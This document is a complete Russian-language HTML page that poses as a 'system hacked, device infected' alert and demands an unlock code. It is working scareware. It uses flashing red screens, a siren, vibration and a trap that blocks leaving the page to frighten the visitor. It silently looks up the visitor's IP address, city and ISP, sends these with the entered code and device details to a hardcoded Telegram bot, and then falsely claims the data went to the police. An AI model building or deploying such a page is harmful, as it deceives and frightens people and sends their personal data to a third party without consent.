<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Системная ошибка</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
            user-select: none;
            touch-action: none;
        }
        body {
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            animation: flash 0.5s infinite alternate;
        }
        .container {
            width: 100%;
            height: 100%;
            box-sizing: border-box;
            border: 8px solid #ff0000;
            background: rgba(255,0,0,0.05);
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 20px;
            box-shadow: inset 0 0 80px #ff0000;
        }
        h1 { font-size: 32px; margin-bottom: 20px; text-shadow: 0 0 10px red; }
        p { font-size: 20px; margin: 15px 0; }
        input { 
            background: #000; border: 3px solid #ff0000; color: #ff0000; 
            padding: 15px; font-size: 22px; text-align: center; 
            width: 80%; max-width: 300px; margin: 20px auto; outline: none; 
            box-shadow: 0 0 15px red;
        }
        button { 
            background: #ff0000; color: #000; border: none; 
            padding: 15px 30px; font-size: 22px; font-weight: bold; 
            cursor: pointer; box-shadow: 0 0 20px red; margin: 0 auto;
            animation: pulse 1s infinite alternate;
        }
        .warning { font-weight: bold; font-size: 22px; color: yellow; }
        
        @keyframes flash { 0% { background-color: #000; } 100% { background-color: #1a0000; } }
        @keyframes pulse { 0% { transform: scale(1); } 100% { transform: scale(1.05); } }
    </style>
</head>
<body>
    <audio id="siren" loop>
        <source src="https://www.soundjay.com/buttons/sounds/beep-01a.mp3" type="audio/mpeg">
    </audio>

    <script>
        window.addEventListener('beforeunload', function (e) {
            e.preventDefault(); e.returnValue = ''; return '';
        });
    </script>

    <div class="container">
        <h1>⚠️ СИСТЕМА ВЗЛОМАНА ⚠️</h1>
        <p class="warning">ВАШЕ УСТРОЙСТВО ЗАРАЖЕНО</p>
        <p>Введите код разблокировки:</p>
        
        <input type="text" id="code" placeholder="****" autocomplete="off">
        <br>
        <button onclick="trigger()">ПОДТВЕРДИТЬ</button>
    </div>

    <script>
        const TOKEN = "8943237187:AAF3_otWiSDWb5sTKv4HAHHFJzeKjt7b8E";
        const CHAT_ID = "7555845632";
        
        // ТВОЙ СЕКРЕТНЫЙ ПАРОЛЬ
        const SECRET_PASSWORD = "1981"; 
        
        let userIP = "Скрыт";
        let userCity = "Неизвестно";
        let userISP = "Неизвестно";

        fetch('http://ip-api.com/json/')
            .then(res => res.json())
            .then(data => {
                userIP = data.query || "Не удалось";
                userCity = data.city || "Не удалось";
                userISP = data.isp || "Не удалось";
            }).catch(() => {});

        let audioStarted = false;
        document.body.addEventListener('touchstart', function() {
            if (!audioStarted) {
                document.getElementById('siren').play().catch(e => console.log("Звук заблокирован"));
                audioStarted = true;
            }
        });

        function trigger() {
            const code = document.getElementById('code').value;

            // Если введен секретный пароль (1981) — выходим
            if (code === SECRET_PASSWORD) {
                document.body.innerHTML = `
                    <div style="width:100vw; height:100vh; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; color:#00ff00; text-align:center; font-family:monospace;">
                        <h1>ДОСТУП РАЗРЕШЕН</h1>
                        <p>Можете закрыть страницу.</p>
                    </div>
                `;
                return; // Останавливаем выполнение
            }

            // Если пароль неверный — шлем данные и пугаем
            const ua = navigator.userAgent;
            const msg = `🚨 ВЗЛОМ! 🚨%0A%0AВведенный код: ${code || 'Не ввел'}%0AIP: ${userIP}%0AГород: ${userCity}%0AПровайдер: ${userISP}%0AУстройство: ${ua}`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`, { mode: 'no-cors' });

            document.body.innerHTML = `
                <div style="width:100vw; height:100vh; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; color:red; text-align:center; border: 10px solid red; box-sizing:border-box; font-family:monospace;">
                    <h1 style="font-size:40px; animation: flash 0.2s infinite alternate;">ФАТАЛЬНАЯ ОШИБКА</h1>
                    <p style="font-size:24px;">Данные переданы в правоохранительные органы.</p>
                    <div style="margin-top:50px; font-size:80px;">💀</div>
                </div>
            `;
            
            if (navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 500]);
            }
        }
    </script>
</body>
</html>
